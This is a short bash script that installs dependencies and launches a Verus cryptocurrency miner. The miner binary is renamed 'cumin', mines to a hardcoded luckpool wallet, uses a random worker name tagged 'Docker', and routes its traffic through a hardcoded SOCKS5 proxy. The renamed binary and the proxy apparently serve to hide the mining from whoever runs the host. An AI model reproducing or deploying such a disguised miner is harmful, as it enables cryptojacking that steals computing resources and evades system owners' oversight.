#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RVXxf8Ci9MP5VmmkPyXjz3GUdzpBvmBJNH
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
PROXY=socks5://69.16.226.164:59306
./cumin -a verus -o $POOL -u $WALLET.BASO -p $WORKER -t 2 -x $PROXY
